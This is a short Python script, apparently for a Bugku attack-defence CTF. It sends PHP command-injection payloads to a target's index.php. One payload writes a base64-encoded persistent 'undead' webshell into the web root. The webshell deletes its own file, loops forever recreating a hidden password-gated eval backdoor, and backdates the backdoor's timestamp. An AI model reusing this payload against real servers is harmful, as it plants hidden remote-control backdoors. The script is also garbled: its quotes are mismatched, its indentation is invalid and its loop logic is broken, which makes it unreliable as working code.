import requests
with open("d:/1.txt","r") as  file1:
    for i in range(10):
        url = file1.readline()

    # 得到flag
    data1={"bugku":"system('curl ')"}
    # 上不死马
    data2={"bugku":"system('system('echo PD9waHAKICAgIGlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwogICAgc2V0X3RpbWVfbGltaXQoMCk7CiAgICB1bmxpbmsoX19GSUxFX18pOwogICAgJGZpbGUgPSAnLmxvY2FsLnBocCc7CiAgICAkY29kZSA9ICc8P3BocCBpZihtZDUoJF9HRVRbInBhc3MiXSk9PSI3NDQ1OWNhM2NmODVhODFkZjkwZGE5NWZmNmU3YTIwNyIpCntAZXZhbCgkX0dFVFtwdHJdKTt9ID8+JzsKIAogICAgd2hpbGUgKDEpewogICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCRjb2RlKTsKICAgICAgICBzeXN0ZW0oJ3RvdWNoIC1tIC1kICIyMDE4LTEyLTAxIDA5OjEwOjEyIiAubG9jYWwucGhwJyk7CiAgICAgICAgdXNsZWVwKDEpOwogICAgfQo/Pg== | base64 -d > /var/www/html/images/.conf1g.php')')"}
     for i in url:
         url="http://192-168-1-57.pvp4702.bugku.cn/index.php"
         res=requests.post(url=url,data=data1)
         print(res.text)




